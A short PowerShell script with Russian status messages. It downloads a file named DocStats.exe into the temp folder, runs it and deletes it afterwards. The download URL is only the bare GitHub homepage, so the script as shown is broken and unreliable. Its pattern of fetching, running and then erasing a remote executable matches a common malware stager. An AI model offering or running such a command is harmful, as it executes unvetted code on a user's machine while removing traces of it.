$u="https://github.com"
$p="$env:TEMP\DocStats.exe"
if (Test-Path $p) { rm $p -Force -ErrorAction SilentlyContinue }
Write-Host "Загрузка программы..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $u -OutFile $p
Write-Host "Запуск..." -ForegroundColor Green
& $p
if (Test-Path $p) { rm $p -Force -ErrorAction SilentlyContinue }
